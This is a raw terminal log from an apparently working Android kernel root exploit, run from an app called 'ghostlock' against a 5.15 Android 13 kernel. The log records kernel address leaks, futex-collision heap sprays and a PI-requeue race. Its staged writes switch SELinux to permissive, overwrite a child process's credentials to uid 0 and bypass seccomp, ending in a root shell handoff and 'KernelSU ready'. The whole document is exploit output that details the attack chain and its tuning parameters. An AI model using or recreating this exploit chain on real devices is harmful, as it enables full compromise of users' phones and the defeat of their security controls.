[33m[*] [0mroot script written path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh bytes=5225
[33m[*] [0mkernel: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[32m[+] [0mresolved profile loaded: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[33m[*] [0mcpu pair: main=0 consumer=1
[33m[*] [0mruntime home=/data/user/0/com.ghostlock.app/files script=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[33m[*] [0mruntime verbose_debug=1
[33m[*] [0mdebug.execution.begin release=5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[33m[*] [0mdebug.execution.recommended_cpus.main=0
[33m[*] [0mdebug.execution.recommended_cpus.consumer=1
[33m[*] [0mdebug.execution.selected_cpus.main=0
[33m[*] [0mdebug.execution.selected_cpus.consumer=1
[33m[*] [0mdebug.execution.heap.prepare_max_attempts=4
[33m[*] [0mdebug.execution.heap.prepare_timeout_ms=240000
[33m[*] [0mdebug.execution.heap.kernelsnitch_timeout_ms=60000
[33m[*] [0mdebug.execution.race.route_wait_ms=1000
[33m[*] [0mdebug.execution.race.setup_settle_us=50000
[33m[*] [0mdebug.execution.race.state_poll_interval_us=1000
[33m[*] [0mdebug.execution.stages.w1_attempts=15
[33m[*] [0mdebug.execution.stages.w1_settle_us=100000
[33m[*] [0mdebug.execution.stages.w1_scratch_repair_attempts=3
[33m[*] [0mdebug.execution.stages.w2_attempts=15
[33m[*] [0mdebug.execution.stages.w2_settle_us=100000
[33m[*] [0mdebug.execution.stages.w3_chain_rounds=3
[33m[*] [0mdebug.execution.stages.w3_attempts=6
[33m[*] [0mdebug.execution.stages.w3_settle_us=50000
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.attempts=2000
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.arm_sequence=16
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.post_receive_hold_iterations=20000
[33m[*] [0mdebug.execution.routes.select_stack.enter_delay_us=50000
[33m[*] [0mdebug.execution.routes.select_stack.timeout_us=200000
[33m[*] [0mdebug.execution.routes.select_stack.consumer_max_calls=1
[33m[*] [0mdebug.execution.routes.select_stack.consumer_burst_calls=1
[33m[*] [0mdebug.execution.routes.multicast_waiter.ready_timeout_ms=10000
[33m[*] [0mdebug.execution.routes.multicast_waiter.post_requeue_settle_us=200000
[33m[*] [0mdebug.execution.routes.multicast_waiter.post_adjust_settle_us=100000
[33m[*] [0mdebug.execution.handoff.pre_dispatch_settle_ms=2000
[33m[*] [0mdebug.execution.handoff.module_poll_attempts=30
[33m[*] [0mdebug.execution.handoff.module_poll_interval_ms=100
[33m[*] [0mdebug.execution.handoff.enforce_poll_attempts=200
[33m[*] [0mdebug.execution.handoff.enforce_poll_interval_ms=100
[33m[*] [0mdebug.execution.end
[33m[*] [0msoc: qcom/other; kernel_phys_load=0xa8000000
[33m[*] [0minit_cred image=ffffffc082bfd588 alias=ffffff802abfd588
[33m[*] [0miomem cache: direct_map_end=ffffff8a80000000
[32m[+] [0mstartup context pid=11241 uid=10510 euid=10510 gid=10510 egid=10510 boot_ms=47760 attr=u:r:untrusted_app:s0:c254,c257,c512,c768 enforce=unreadable
[32m[+] [0mstartup limits pid=11241 NoNewPrivs=0 Seccomp=2 Seccomp_filters=1
[32m[+] [0mbuild config pid=11241 label=ghostlock_oplus slide=pselect main=pselect
[32m[+] [0mp0 profile pid=11241 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff802ab01e28 bootid_data=ffffff802adc6819 init_task=ffffff802ac43400 root_tg=ffffff802ad58ac0 sysctl_bootid=ffffff802adc6819
[33m[*] [0mp0 kernel_phys_load=00000000a8000000 delta=0000000028000000
[33m[*] [0mmain thread running on cpu=0
[33m[*] [0m[T+0ms] exploit start
[31m[-] [0mSELinux enforce unreadable; assuming enforcing and running W1
[33m[*] [0m[T+6ms] pre-W1 drain
[33m[*] [0mW1: SELinux attempt 1/1
[33m[*] [0m=== W1: SELinux === target=0xffffff802adaad88 mode=1 leaf=0
[33m[*] [0m[T+75ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +296ms
[33m[*] [0m[spray] finding futex collisions... +636ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray]   still finding collisions (2s) 31% (futex 0xa000000/0x1000000000)...
[33m[*] [0m[spray] futex collisions found +2991ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff88cf9e6c00 +3130ms
[33m[*] [0m[spray] payload ready +3134ms
[31m[-] [0mpage ffffff88cf9e0000 stores an even byte over selinux_state.initialized; taking another
[31m[-] [0mprepare_kernel_page retry 1/4 +3375ms
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +293ms
[33m[*] [0m[spray] finding futex collisions... +653ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray]   still finding collisions (2s) 31% (futex 0xa000000/0x1000000000)...
[33m[*] [0m[spray] futex collisions found +2944ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff88ec17f000 +3112ms
[33m[*] [0m[spray] payload ready +3118ms
[33m[*] [0mprepare_kernel_page ok attempt=2 +6717ms
[33m[*] [0m[T+6804ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+8818ms]   PI route done
[32m[+] [0mSELinux permissive
[33m[*] [0mW1b: private scratch repair attempt 1/3
[33m[*] [0m=== W1b: private scratch repair === target=0xffffff88ec178108 mode=1 leaf=1
[33m[*] [0m[T+8919ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +292ms
[33m[*] [0m[spray] finding futex collisions... +547ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +2346ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff88fd97f400 +2423ms
[33m[*] [0m[spray] payload ready +2428ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2608ms
[33m[*] [0m[T+11530ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+13539ms]   PI route done
[32m[+] [0mprivate scratch repaired; releasing quarantine
[33m[*] [0m[T+13545ms] Write 1 complete
[33m[*] [0m[T+13754ms] pre-W2 drain
[33m[*] [0mperf task: 0xffffff89314dec00 (173/256 votes)
[33m[*] [0mperf task: 0xffffff89314dec00 (184/256 votes)
[33m[*] [0m[T+14582ms] perf_find_task done
[33m[*] [0mchild_pid=20960 child_task=0xffffff89314dec00
[33m[*] [0mvr.ko not loaded; skipping tag clear
[33m[*] [0mW2: cred attempt 1/15
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +229ms
[33m[*] [0m[spray] finding futex collisions... +452ms
[33m[*] [0m[spray] early collision screen 14/7 at 31%
[33m[*] [0m[spray] futex collisions found +2023ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff802619b800 +2051ms
[33m[*] [0m[spray] payload ready +2056ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2218ms
[33m[*] [0mW2 fast repair payload prebuilt
[33m[*] [0m=== W2: cred === target=0xffffff89314df398 mode=2 leaf=0
[33m[*] [0m[T+17013ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +240ms
[33m[*] [0m[spray] finding futex collisions... +485ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +2068ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff8920a70800 +2095ms
[33m[*] [0m[spray] payload ready +2105ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2274ms
[33m[*] [0m[T+19291ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+21301ms]   PI route done
[33m[*] [0mW2b: firing prebuilt init_cred+8 repair
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0mchild uid = 0
[32m[+] [0mchild is root!
[33m[*] [0mW3: TIF_SECCOMP+mode attempt 1/6
[33m[*] [0m=== W3: TIF_SECCOMP === target=0xffffff89314dec00 mode=1 leaf=1
[33m[*] [0m[T+22639ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +236ms
[33m[*] [0m[spray] finding futex collisions... +502ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +2216ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff89209a2000 +2233ms
[33m[*] [0m[spray] payload ready +2247ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2423ms
[33m[*] [0m[T+25066ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+27084ms]   PI route done
[33m[*] [0m=== W3: seccomp mode === target=0xffffff89314df460 mode=1 leaf=1
[33m[*] [0m[T+27139ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +244ms
[33m[*] [0m[spray] finding futex collisions... +512ms
[33m[*] [0m[spray] early collision screen 13/7 at 31%
[33m[*] [0m[spray] futex collisions found +2029ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff8920b3ec00 +2049ms
[33m[*] [0m[spray] payload ready +2055ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2225ms
[33m[*] [0m[T+29370ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+31378ms]   PI route done
[33m[*] [0mseccomp finit_module probe = 0x16
[32m[+] [0mchild seccomp filter bypassed (finit_module errno=22)
[32m[+] [0mchild seccomp fully bypassed (forked workers run filter-free)
[33m[*] [0m[T+33439ms] exploit complete
[33m[*] [0mhandoff: child=20960 alive=1 sent=1 errno=0
[33m[*] [0mhandoff: root script path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[33m[*] [0mhandoff: root shell worker pid=31686
[33m[*] [0mhandoff: script open fd=3 errno=0 path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[33m[*] [0menforce=1 (enforcing)
[32m[+] [0mKernelSU ready
